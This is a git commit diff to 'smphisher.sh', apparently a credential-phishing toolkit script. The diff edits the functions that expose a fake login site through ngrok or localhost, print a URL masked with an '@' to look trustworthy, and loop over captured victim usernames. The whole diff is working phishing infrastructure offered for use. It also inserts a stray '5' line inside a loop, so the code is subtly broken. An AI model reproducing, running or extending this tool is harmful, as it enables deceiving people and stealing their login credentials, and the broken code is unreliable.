427902194d08292f43aad55c2336bd8a0aaf4e74
PRINCE GUTIERREZ <81812004+PDGHACK-10@users.noreply.github.com>
2021-04-22 18:22:11 +0800

    Update smphisher.sh

--- smphisher.sh
+++ smphisher.sh
@@ -169,7 +169,8 @@ capture_data() {
 			rm -rf .server/www/usernames.txt
 		fi
 		sleep 0.75
-       done
+       5
+	done
 }
 
 ## Start ngrok
@@ -178,29 +179,30 @@ start_ngrok() {
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
 
-
     if [[ `command -v termux-chroot` ]]; then
-        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 
+        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 & # Thanks to Mustakim Ahmed (https://github.com/BDhackers009)
     else
         sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
     fi
 
+	{ sleep 8; clear; banner_small; }
 	ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
 	ngrok_url1=${ngrok_url#https://}
-	echo -e $red URL  : $red $ngrok_url"
-	echo -e $red URL  : $red $mask@$ngrok_url1"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 1 : ${GREEN}$ngrok_url"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL 2 : ${GREEN}$mask@$ngrok_url1"
 	capture_data
 }
 
 ## Start localhost
 start_localhost() {
-	echo -e $red STARTING WAIT......... http://$HOST:$PORT 
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	setup_site
-	echo -e $red Successfully Host : $red http://$HOST:$PORT"
+	{ sleep 1; clear; banner_small; }
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
 	capture_data
 }
 
-## Tunnel selection
+### Tunnel selection
 tunnel_menu() {
 
 echo -e $red  	     Localhost
